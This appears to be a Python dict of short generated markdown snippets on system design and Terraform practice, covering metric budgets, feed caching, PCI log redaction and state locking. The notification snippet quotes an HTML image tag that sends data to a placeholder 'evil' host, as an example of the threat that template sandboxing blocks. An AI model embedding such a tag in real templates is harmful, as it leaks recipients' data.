# Fifth expansion — final push over 1200 words

EXPAND5: dict[str, str] = {
    "system-design-metrics-monitoring": r'''
## Agent cardinality budgets per team

Allocate each team a monthly custom metric series budget — exceeding budget drops new label combinations at ingestion with warning to service owner. Prevents one enthusiastic engineer from labeling `user_id` on a counter and OOMing the shared TSDB. Budget exceptions require platform architect approval with documented cardinality estimate.
''',

    "system-design-news-feed": r'''
## Celebrity pull merge latency budget

Celebrity pull queries run parallel across followed high-follower accounts with 50ms per-account timeout — partial results better than slow feed. Cache celebrity recent posts globally with 30-second TTL; same Taylor Swift post requested million times per minute during album drop.
''',

    "system-design-notification-system": r'''
## Template injection safety

HTML email templates render in sandbox without network egress — prevents template author from exfiltrating data via `<img src="https://evil?data=">`. Plaintext part always generated; MIME multipart validators reject HTML-only marketing sends missing unsubscribe link.
''',

    "system-design-payment-system": r'''
## PCI log redaction pipeline

Central log aggregator drops lines matching PAN regex and Luhn-valid 16-digit sequences before indexing. CI linter fails PRs adding `console.log(cardNumber)` in payment service repos. Quarterly scan for accidental secret commits in payment adapters.
''',

    "system-design-ride-sharing": r'''
## Rider wait-time UX contract

Show honest ETA distribution not point estimate — "3–5 min" when variance high reduces cancellation vs overpromising "2 min" then delivering at 6. Cancel fee policy encoded in trip service rules engine, not hardcoded in mobile clients across regions.
''',

    "system-design-ticketing-booking": r'''
## Payment webhook ordering

Webhooks may arrive before client redirect returns — UI shows `processing` state, never `failed`, until webhook timeout or explicit processor failure. Idempotent `promote_hold_to_sold(payment_id)` safe to call from webhook and client polling simultaneously.
''',

    "terraform-drift-detection": r'''
## Game-day drift injection

Quarterly staging game-day: engineer manually widens security group in sandbox account, verify detection fires within SLA, practice adopt-vs-revert decision under time pressure. Measure detection latency and MTTR; file runbook gap if engineer could not resolve in 30 minutes.
''',

    "terraform-modules-composition": r'''
## Semantic version contract testing

Consumer integration test pins `module.vpc` at `~> 2.0` and runs plan in CI — catches accidental major bump in module registry before production root picks it up via loose version constraint Renovate proposed.
''',

    "terraform-state-management-backends": r'''
## Force-unlock ceremony

`terraform force-unlock` requires two-person rule in prod — second engineer confirms no active apply in CI queue via Terraform Cloud UI screenshot pasted in ticket. Prevents panic unlock during running apply corrupting state.
''',

    "terraform-testing-policy-as-code": r'''
## Plan policy on destroy operations

Separate Conftest package `policies/destroy.rego` denies `delete` on `aws_rds_cluster` in prod workspaces unless PR carries `approved_destroy` label from data platform lead. Destroy policies loaded only for prod plan artifacts — dev sandboxes remain fast.
''',
}
